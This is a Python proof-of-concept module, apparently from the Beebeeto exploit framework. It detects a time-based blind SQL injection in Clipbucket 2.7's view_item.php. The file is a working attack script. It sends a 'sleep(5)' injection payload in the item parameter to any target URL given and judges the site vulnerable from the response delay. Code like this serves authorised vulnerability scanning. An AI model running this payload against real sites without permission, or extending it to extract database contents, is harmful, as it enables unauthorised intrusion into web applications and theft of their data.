# !usr/bin/dev python
# encoding : utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import time
import urllib2
import httplib

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        'poc': {
            'id': 'poc-2015-0050',
            'name': 'Clipbucket 2.7 /clipbucket/view_item.php BLIND SQLInjection POC',
            'author': 'Ca2fux1n',
            'create_date': '2014-03-03',
        },
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        'vul': {
            'app_name': 'Clipbucket',
            'vul_version': ['2.7'],
            'type': 'SQL Injection',
            'tag': ['Clipbucket vulnerability', '/clipbucket/view_item.php', 'php'],
            'desc':
                    '''
                    ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.
                    This script comes with all the bells & whistles required to start your own Video Sharing website like Youtube,
                    Metacafe, Veoh, Hulu or any other top video distribution application in matter of minutes.
                    ClipBucket is fastest growing script which was first started as Youtube Clone but now its
                    advance features & enhancements makes it the most versatile, reliable & scalable media distribution
                    platform with latest social networking features, while staying light on your pockets.
                    Whether you are a small fan club or a big Multi Tier Network operator,
                    Clipbucket will fulfill your video management needs.
                    ''',
            'references': ['https://www.bugscan.net/#!/x/21350',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/clipbucket/view_item.php?item=a%27and%20sleep(5)-- # &type=photos&collection=9'
        verify_url = args['options']['target']
        start_time = time.time()
        request = urllib2.Request(verify_url + payload)
        response = urllib2.urlopen(request)
        page = response.read()
        if args['options']['verbose']:
            print '[*]Request URL: ' + verify_url + payload
        if time.time() - start_time > 5:
            args['options']['success'] = True
            args['poc_ret']['vul_url'] = verify_url + payload
        return args

    exploit = verify


if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())